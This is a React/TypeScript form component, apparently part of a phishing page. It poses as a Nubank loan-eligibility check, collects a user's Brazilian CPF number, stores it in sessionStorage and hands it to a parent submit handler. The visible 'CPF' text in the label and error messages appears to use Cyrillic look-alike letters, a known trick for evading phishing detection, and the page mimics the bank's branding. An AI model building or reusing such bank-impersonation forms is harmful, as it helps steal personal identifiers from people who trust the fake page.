import React, { useState } from 'react';
import { logUserActivity } from '../services/userLogger';

interface CPFFormProps {
  onSubmit: (cpf: string) => void;
  isLoading: boolean;
}

const CPFForm: React.FC<CPFFormProps> = ({ onSubmit, isLoading }) => {
  const [cpf, setCpf] = useState('');
  const [error, setError] = useState('');

  const formatCPF = (value: string): string => {
    const digits = value.replace(/\D/g, '');
    
    if (digits.length <= 3) {
      return digits;
    } else if (digits.length <= 6) {
      return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    } else if (digits.length <= 9) {
      return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    } else {
      return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9, 11)}`;
    }
  };

  const validateCPF = (cpf: string): boolean => {
    const digits = cpf.replace(/\D/g, '');
    
    if (digits.length !== 11) {
      setError('СРF deve conter 11 dígitos');
      return false;
    }
    
    if (/^(\d)\1+$/.test(digits)) {
      setError('СРF inválido');
      return false;
    }
    
    setError('');
    return true;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const formattedValue = formatCPF(value);
    setCpf(formattedValue);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    const isValid = validateCPF(cpf);
    if (isValid) {
      const cpfDigits = cpf.replace(/\D/g, '');
      sessionStorage.setItem('user_cpf', cpfDigits);
      logUserActivity('cpf_submit', {
        cpf_length: cpfDigits.length,
        has_valid_format: true,
      });
      onSubmit(cpfDigits);
    } else {
      logUserActivity('cpf_submit_failed', {
        cpf_length: cpf.replace(/\D/g, '').length,
        error: error,
      });
    }
  };

  return (
    <div className="bg-white rounded-xl shadow-xl p-4 md:p-8 w-full max-w-md mx-auto transition-all duration-300 hover:shadow-2xl">
      <h2 className="text-xl md:text-2xl font-semibold text-gray-800 mb-4 md:mb-6">Consulta de Empréstimo</h2>
      <p className="text-sm md:text-base text-gray-600 mb-4 md:mb-6">
        Verifique se você possui empréstimos disponíveis inserindo seu СРF abaixo.
      </p>
      
      <form onSubmit={handleSubmit}>
        <div className="mb-4 md:mb-6">
          <label htmlFor="cpf" className="block text-xs md:text-sm font-medium text-gray-700 mb-2">
            СРF
          </label>
          <input
            id="cpf"
            type="text"
            value={cpf}
            onChange={handleCPFChange}
            placeholder="000.000.000-00"
            maxLength={14}
            className={`w-full px-3 py-2.5 md:px-4 md:py-3 text-sm md:text-base rounded-lg border ${error ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all duration-200`}
            required
          />
          {error && <p className="mt-2 text-xs md:text-sm text-red-600">{error}</p>}
          <p className="mt-2 text-xs md:text-sm text-gray-500">
            Use o CPF que utilizou ao criar sua conta Nubank
          </p>
        </div>

        <button
          type="submit"
          disabled={isLoading || cpf.replace(/\D/g, '').length !== 11}
          className={`w-full bg-purple-600 text-white font-semibold py-2.5 md:py-3 px-6 text-sm md:text-base rounded-lg transition-all duration-300 ${
            isLoading || cpf.replace(/\D/g, '').length !== 11
              ? 'opacity-70 cursor-not-allowed'
              : 'hover:bg-purple-700 transform hover:-translate-y-1 hover:shadow-lg'
          }`}
        >
          {isLoading ? (
            <span className="flex items-center justify-center">
              <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              Consultando...
            </span>
          ) : (
            <span className="text-sm md:text-base">Verificar Empréstimo</span>
          )}
        </button>
      </form>
    </div>
  );
};

export default CPFForm;